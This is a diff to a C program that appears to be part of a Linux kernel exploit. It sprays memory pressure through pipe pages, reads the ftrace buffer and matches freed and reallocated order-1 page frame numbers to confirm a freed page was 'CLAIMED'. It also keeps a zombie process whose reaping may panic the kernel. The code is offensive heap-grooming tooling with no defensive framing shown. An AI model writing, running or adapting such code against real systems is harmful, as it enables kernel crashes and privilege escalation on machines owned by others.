@@ -593,10 +593,21 @@ static int pressure_spray(void)
 
     printf("=== pressure spray ===\n");
     write_str(T "/tracing_on", "0\n");
+    /* the spray generates tens of thousands of page events; a small ring buffer
+     * would evict the free records we are looking for */
+    if (write_str(T "/buffer_size_kb", "16384\n") == 0) {
+        printf("trace buffer -> 16384 KiB\n");
+    } else {
+        printf("trace buffer resize denied\n");
+    }
     { int fd = open(T "/trace", O_WRONLY | O_TRUNC); if (fd >= 0) close(fd); }
     write_str(T "/tracing_on", "1\n");
 
-    held = hold_pipe_pages(PRESSURE_MB);
+    {
+        const char *e = getenv("PRESSURE_MB");
+        int mb = e ? atoi(e) : PRESSURE_MB;
+        held = hold_pipe_pages(mb);
+    }
     printf("pressure: %d MiB held in pipe pages\n", held);
 
     if (pipe(pipefd) != 0) return -1;
@@ -653,43 +664,72 @@ static int pressure_spray(void)
     printf("sprayer: %d streams\n", sc.sent);
 
     {
-        unsigned long long frees[128], allocs[128];
-        char big[1 << 20];
-        int fd = open(T "/trace", O_RDONLY);
+        unsigned long long frees[256], allocs[256];
         int nf = 0, na = 0, hit = 0;
-        if (fd >= 0) {
-            ssize_t n = read(fd, big, sizeof(big) - 1);
+        size_t cap = 64u << 20, used = 0;
+        char *big = malloc(cap);
+        int fd = open(T "/trace", O_RDONLY);
+
+        if (fd >= 0 && big) {
+            for (;;) {
+                ssize_t n = read(fd, big + used, cap - used - 1);
+                if (n <= 0) break;
+                used += (size_t)n;
+                if (used + 2 >= cap) break;
+            }
             close(fd);
-            if (n > 0) {
+            big[used] = 0;
+            printf("trace bytes read: %zu\n", used);
+            {
                 char *line = big;
-                big[n] = 0;
                 while (line && *line) {
                     char *nl = strchr(line, '\n');
                     if (nl) *nl = 0;
-                    if (strstr(line, "order=1")) {
+                    {
+                        char *ord = strstr(line, "order=1");
+                        int ok = 0;
+                        if (ord) {
+                            char c = ord[7];
+                            ok = (c == '\0' || c == ' ' || c == '\t' || c == ',');
+                        }
+                        if (ok) {
                         char *pp = strstr(line, "pfn=0x");
-                        if (pp && strstr(line, "mm_page_free") && nf < 128)
-                            frees[nf++] = strtoull(pp + 6, NULL, 16);
-                        else if (pp && strstr(line, "mm_page_alloc") && na < 128)
-                            allocs[na++] = strtoull(pp + 6, NULL, 16);
+                        if (pp) {
+                            if (strstr(line, "mm_page_free") && nf < 256)
+                                frees[nf++] = strtoull(pp + 6, NULL, 16);
+                            else if (strstr(line, "mm_page_alloc") && na < 256)
+                                allocs[na++] = strtoull(pp + 6, NULL, 16);
+                        }
+                        }
                     }
                     line = nl ? nl + 1 : NULL;
                 }
             }
         }
+        if (big) free(big);
         printf("order-1 frees=%d allocs=%d\n", nf, na);
         {
             int i2, j2;
-            for (i2 = 0; i2 < nf && i2 < 8; i2++) printf("  free  pfn=0x%llx\n", frees[i2]);
-            for (j2 = 0; j2 < na && j2 < 8; j2++) printf("  alloc pfn=0x%llx\n", allocs[j2]);
+            for (i2 = 0; i2 < nf && i2 < 6; i2++) printf("  free  pfn=0x%llx\n", frees[i2]);
+            for (j2 = 0; j2 < na && j2 < 6; j2++) printf("  alloc pfn=0x%llx\n", allocs[j2]);
             for (i2 = 0; i2 < nf; i2++)
                 for (j2 = 0; j2 < na; j2++)
-                    if (frees[i2] == allocs[j2]) { printf("  CLAIMED pfn=0x%llx\n", frees[i2]); hit++; }
+                    if (frees[i2] == allocs[j2]) { printf("  *** CLAIMED pfn=0x%llx ***\n", frees[i2]); hit++; }
         }
         if (!hit) printf("  no order-1 PFN intersection\n");
     }
-    printf("holding %d MiB and the zombie %d; NOT exiting (exit would let init reap)\n", held, (int)child);
-    for (;;) pause();
+    printf("holding %d MiB, zombie %d\n", held, (int)child);
+    {
+        const char *e = getenv("PARK_SEC");
+        int park = e ? atoi(e) : 0;
+        if (park > 0) {
+            printf("parking %d s (exit would let init reap the zombie)\n", park);
+            sleep(park);
+        } else {
+            printf("exiting now; init will reap the zombie (possible panic on reap)\n");
+            fflush(stdout);
+        }
+    }
     return 0;
 }
 
